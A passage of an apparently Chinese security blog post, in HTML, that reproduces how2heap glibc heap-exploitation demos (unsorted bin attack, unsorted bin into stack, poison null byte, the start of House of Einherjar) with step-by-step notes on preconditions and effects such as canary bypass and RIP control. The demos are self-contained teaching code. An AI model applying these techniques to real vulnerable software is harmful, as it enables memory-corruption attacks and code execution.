remove from unsorted list */</span></span><br><span class="line"><span class="comment">//bck = victim-&gt;bk;</span></span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">          malloc_printerr (<span class="string">"malloc(): corrupted unsorted chunks 3"</span>);</span><br><span class="line">        unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">        bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure><p>wiki上的图更清楚</p><p><img src="/2021/05/19/how2heap/unsorted_bin_attack_order.png" alt="img"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This file demonstrates unsorted bin attack by write a large unsigned long value into stack\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the "</span></span><br><span class="line">   <span class="string">"global variable global_max_fast in libc for further fastbin attack\n\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var=<span class="number">0</span>;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Let's first look at the target we want to rewrite on stack:\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%p: %ld\n\n"</span>, &amp;stack_var, stack_var);</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> *p=<span class="built_in">malloc</span>(<span class="number">400</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now, we allocate first normal chunk on the heap at: %p\n"</span>,p);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"And allocate another normal chunk in order to avoid consolidating the top chunk with"</span></span><br><span class="line">           <span class="string">"the first one during the free()\n\n"</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">500</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer "</span></span><br><span class="line">   <span class="string">"point to %p\n"</span>,(<span class="keyword">void</span>*)p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">p[<span class="number">1</span>]=(<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var<span class="number">-2</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"And we write it with the target address-16 (in 32-bits machine, it should be target address-8):%p\n\n"</span>,(<span class="keyword">void</span>*)p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">400</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Let's malloc again to get the chunk we just free. During this time, the target should have already been "</span></span><br><span class="line">   <span class="string">"rewritten:\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%p: %p\n"</span>, &amp;stack_var, (<span class="keyword">void</span>*)stack_var);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>基本流程如下：</p><ol><li>先分配一个属于unsorted bin的堆块，然后释放</li><li>修改其bk指针为栈上的变量，继续分配相同大小的chunk</li><li>就可以将栈上的变量修改为一个较大的值</li></ol><p>利用条件：得有unsorted bin的大小chunk</p><p><strong>影响：可以覆盖栈上的值，但这个值不为我们所控。unsorted bin attack常常用于为其他的攻击做辅助,比如覆写global_max_fast来为fastbin attack做辅助</strong></p></blockquote><h1 id="0x10-unsorted-bin-into-stack"><a href="#0x10-unsorted-bin-into-stack" class="headerlink" title="0x10 unsorted bin into stack"></a>0x10 unsorted bin into stack</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">jackpot</span><span class="params">()</span></span>&#123; <span class="built_in">printf</span>(<span class="string">"Nice jump d00d\n"</span>); <span class="built_in">exit</span>(<span class="number">0</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">intptr_t</span> stack_buffer[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Allocating the victim chunk\n"</span>);</span><br><span class="line"><span class="keyword">intptr_t</span>* victim = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Allocating another chunk to avoid consolidating the top chunk with the small one during the free()\n"</span>);</span><br><span class="line"><span class="keyword">intptr_t</span>* p1 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Freeing the chunk %p, it will be inserted in the unsorted bin\n"</span>, victim);</span><br><span class="line"><span class="built_in">free</span>(victim);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Create a fake chunk on the stack"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Set size for next allocation and the bk pointer to any writable address"</span>);</span><br><span class="line">stack_buffer[<span class="number">1</span>] = <span class="number">0x100</span> + <span class="number">0x10</span>;</span><br><span class="line">stack_buffer[<span class="number">3</span>] = (<span class="keyword">intptr_t</span>)stack_buffer;</span><br><span class="line"></span><br><span class="line"><span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Now emulating a vulnerability that can overwrite the victim-&gt;size and victim-&gt;bk pointer\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Size should be different from the next request size to return fake_chunk and need to pass the check 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem\n"</span>);</span><br><span class="line">victim[<span class="number">-1</span>] = <span class="number">32</span>;</span><br><span class="line">victim[<span class="number">1</span>] = (<span class="keyword">intptr_t</span>)stack_buffer; <span class="comment">// victim-&gt;bk is pointing to stack</span></span><br><span class="line"><span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Now next malloc will return the region of our fake chunk: %p\n"</span>, &amp;stack_buffer[<span class="number">2</span>]);</span><br><span class="line"><span class="keyword">char</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"malloc(0x100): %p\n"</span>, p2);</span><br><span class="line"></span><br><span class="line"><span class="keyword">intptr_t</span> sc = (<span class="keyword">intptr_t</span>)jackpot; <span class="comment">// Emulating our in-memory shellcode</span></span><br><span class="line"><span class="built_in">memcpy</span>((p2+<span class="number">40</span>), &amp;sc, <span class="number">8</span>); <span class="comment">// This bypasses stack-smash detection since it jumps over the canary</span></span><br><span class="line"></span><br><span class="line">assert((<span class="keyword">long</span>)__builtin_return_address(<span class="number">0</span>) == (<span class="keyword">long</span>)jackpot);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>基本流程：</p><ol><li>分配一个栈上的数组</li><li>分配两个堆，释放其中一个</li><li>伪造栈上的的fake chunk，至少需要更改size和bk指针</li><li>修改释放的chunk的bk和size域，使栈上的chunk进入unsorted bin</li><li>分配chunk和栈上fake chunk的size一样大</li></ol><p>利用条件：我们得知道栈上的位置，并进行相应的伪造</p><p><strong>影响：利用此种方法我们绕过stack cannary或者直接更改rip的值</strong></p></blockquote><h1 id="0x11-poison-null-bytes"><a href="#0x11-poison-null-bytes" class="headerlink" title="0x11 poison null bytes"></a>0x11 poison null bytes</h1><p><strong>chunk size属性的最小的有效字节不能是0x00,最小的也必须是0x10,因为chunk的size包括请求的量加上元数据所需的大小(也就是我们的size和pre_size然后空间复用*</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Welcome to poison null byte 2.0!\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Tested in Ubuntu 16.04 64bit.\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint8_t</span>* a;</span><br><span class="line"><span class="keyword">uint8_t</span>* b;</span><br><span class="line"><span class="keyword">uint8_t</span>* c;</span><br><span class="line"><span class="keyword">uint8_t</span>* b1;</span><br><span class="line"><span class="keyword">uint8_t</span>* b2;</span><br><span class="line"><span class="keyword">uint8_t</span>* d;</span><br><span class="line"><span class="keyword">void</span> *barrier;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"We allocate 0x100 bytes for 'a'.\n"</span>);</span><br><span class="line">a = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"a: %p\n"</span>, a);</span><br><span class="line"><span class="keyword">int</span> real_a_size = malloc_usable_size(a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Since we want to overflow 'a', we need to know the 'real' size of 'a' "</span></span><br><span class="line"><span class="string">"(it may be more than 0x100 because of rounding): %#x\n"</span>, real_a_size);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* chunk size attribute cannot have a least significant byte with a value of 0x00.</span></span><br><span class="line"><span class="comment"> * the least significant byte of this will be 0x10, because the size of the chunk includes</span></span><br><span class="line"><span class="comment"> * the amount requested plus some amount required for the metadata. */</span></span><br><span class="line">b = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"b: %p\n"</span>, b);</span><br><span class="line"></span><br><span class="line">c = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"c: %p\n"</span>, c);</span><br><span class="line"></span><br><span class="line">barrier =  <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"We allocate a barrier at %p, so that c is not consolidated with the top-chunk when freed.\n"</span></span><br><span class="line"><span class="string">"The barrier is not strictly necessary, but makes things less confusing\n"</span>, barrier);</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span>* b_size_ptr = (<span class="keyword">uint64_t</span>*)(b - <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// added fix for size==prev_size(next_chunk) check in newer versions of glibc</span></span><br><span class="line"><span class="comment">// https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30</span></span><br><span class="line"><span class="comment">// this added check requires we are allowed to have null pointers in b (not just a c string)</span></span><br><span class="line"><span class="comment">//*(size_t*)(b+0x1f0) = 0x200;</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"In newer versions of glibc we will need to have our updated size inside b itself to pass "</span></span><br><span class="line"><span class="string">"the check 'chunksize(P) != prev_size (next_chunk(P))'\n"</span>);</span><br><span class="line"><span class="comment">// we set this location to 0x200 since 0x200 == (0x211 &amp; 0xff00)</span></span><br><span class="line"><span class="comment">// which is the value of b.size after its first byte has been overwritten with a NULL byte</span></span><br><span class="line">*(<span class="keyword">size_t</span>*)(b+<span class="number">0x1f0</span>) = <span class="number">0x200</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// this technique works by overwriting the size metadata of a free chunk</span></span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"b.size: %#lx\n"</span>, *b_size_ptr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"b.size is: (0x200 + 0x10) | prev_in_use\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"We overflow 'a' with a single null byte into the metadata of 'b'\n"</span>);</span><br><span class="line">a[real_a_size] = <span class="number">0</span>; <span class="comment">// &lt;--- THIS IS THE "EXPLOITED BUG"</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"b.size: %#lx\n"</span>, *b_size_ptr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span>* c_prev_size_ptr = ((<span class="keyword">uint64_t</span>*)c)<span class="number">-2</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"c.prev_size is %#lx\n"</span>,*c_prev_size_ptr);</span><br><span class="line"></span><br><span class="line"><span class="comment">// This malloc will result in a call to unlink on the chunk where b was.</span></span><br><span class="line"><span class="comment">// The added check (commit id: 17f487b), if not properly handled as we did before,</span></span><br><span class="line"><span class="comment">// will detect the heap corruption now.</span></span><br><span class="line"><span class="comment">// The check is this: chunksize(P) != prev_size (next_chunk(P)) where</span></span><br><span class="line"><span class="comment">// P == b-0x10, chunksize(P) == *(b-0x10+0x8) == 0x200 (was 0x210 before the overflow)</span></span><br><span class="line"><span class="comment">// next_chunk(P) == b-0x10+0x200 == b+0x1f0</span></span><br><span class="line"><span class="comment">// prev_size (next_chunk(P)) == *(b+0x1f0) == 0x200</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"We will pass the check since chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))\n"</span>,</span><br><span class="line">*((<span class="keyword">size_t</span>*)(b<span class="number">-0x8</span>)), *(<span class="keyword">size_t</span>*)(b<span class="number">-0x10</span> + *((<span class="keyword">size_t</span>*)(b<span class="number">-0x8</span>))));</span><br><span class="line">b1 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"b1: %p\n"</span>,b1);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Now we malloc 'b1'. It will be placed where 'b' was. "</span></span><br><span class="line"><span class="string">"At this point c.prev_size should have been updated, but it was not: %#lx\n"</span>,*c_prev_size_ptr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Interestingly, the updated value of c.prev_size has been written 0x10 bytes "</span></span><br><span class="line"><span class="string">"before c.prev_size: %lx\n"</span>,*(((<span class="keyword">uint64_t</span>*)c)<span class="number">-4</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"We malloc 'b2', our 'victim' chunk.\n"</span>);</span><br><span class="line"><span class="comment">// Typically b2 (the victim) will be a structure with valuable pointers that we want to control</span></span><br><span class="line"></span><br><span class="line">b2 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"b2: %p\n"</span>,b2);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(b2,<span class="string">'B'</span>,<span class="number">0x80</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Current b2 content:\n%s\n"</span>,b2);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Now we free 'b1' and 'c': this will consolidate the chunks 'b1' and 'c' (forgetting about 'b2').\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(b1);</span><br><span class="line"><span class="built_in">free</span>(c);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Finally, we allocate 'd', overlapping 'b2'.\n"</span>);</span><br><span class="line">d = <span class="built_in">malloc</span>(<span class="number">0x300</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"d: %p\n"</span>,d);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Now 'd' and 'b2' overlap.\n"</span>);</span><br><span class="line"><span class="built_in">memset</span>(d,<span class="string">'D'</span>,<span class="number">0x300</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"New b2 content:\n%s\n"</span>,b2);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Thanks to https://www.contextis.com/resources/white-papers/glibc-adventures-the-forgotten-chunks"</span></span><br><span class="line"><span class="string">"for the clear explanation of this technique.\n"</span>);</span><br><span class="line"></span><br><span class="line">assert(<span class="built_in">strstr</span>(b2, <span class="string">"DDDDDDDDDDDD"</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>利用空字节覆盖size位，从而达到overlap的目的</p><p>但这里会有一个check</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;b=<span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line">&gt;chunksize(P)==prev_size(next_chunk(P))</span><br><span class="line">&gt;#chunksize(P)=*(b<span class="number">-0x8</span>)</span><br><span class="line">&gt;#prev_size(next_chunk(P))=*(b<span class="number">-0x10</span>+*((<span class="keyword">size_t</span>*)(b<span class="number">-0x8</span>)))</span><br></pre></td></tr></table></figure><p>基本流程：</p><ol><li>分配四个堆a b c d，最后一个是用来阻挡top chunk的</li><li>我们需要先修改check位的size，然后释放b，最后利用a的溢出修改b的size位（注意这里的check会在下一才malloc时出现）</li><li>之后malloc b1 b2,b2就是我们需要overlap的地方</li><li>此时free b1 和 c（prev_size=0x210）就会把b2 overlap掉</li><li>在malloc一下，我们就能拿到b2的权限了</li></ol><p>利用条件：首先我们得有双链表这个东西，也就是unsorted bin（因为fastbin中inuse永远为1），其次有空字节溢出，具体方法就是先更改check的size位，然后进行溢出</p><p><strong>影响：我们主要是拿来overlap的</strong></p></blockquote><h1 id="0x12-house-of-einherjar"><a href="#0x12-house-of-einherjar" class="headerlink" title="0x12 house of einherjar"></a>0x12 house of einherjar</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Credit to st4g3r for publishing this technique</span></span><br><span class="line"><span class="comment">   The House of Einherjar uses an off-by-one overflow with a null byte to control the pointers returned by malloc()</span></span><br><span class="line"><span class="comment">   This technique may result in a more powerful primitive than the Poison Null Byte, but it has the additional requirement of a heap leak. </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Welcome to House of Einherjar!\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Tested in Ubuntu 16.04 64bit.\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint8_t</span>* a;</span><br><span class="line"><span class="keyword">uint8_t</span>* b;</span><br><span class="line"><span class="keyword">uint8_t</span>* d;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\nWe allocate 0x38 bytes for 'a'\n"</span>);</span><br><span class="line">a = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x38</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"a: %p\n"</span>, a);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> real_a_size = malloc_usable_size(a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Since we want to overflow 'a', we need the 'real' size of 'a' after rounding: %#x\n"</span>, real_a_size);</span><br><span class="line"></span><br><span class="line"><span class="comment">// create a fake chunk</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\nWe 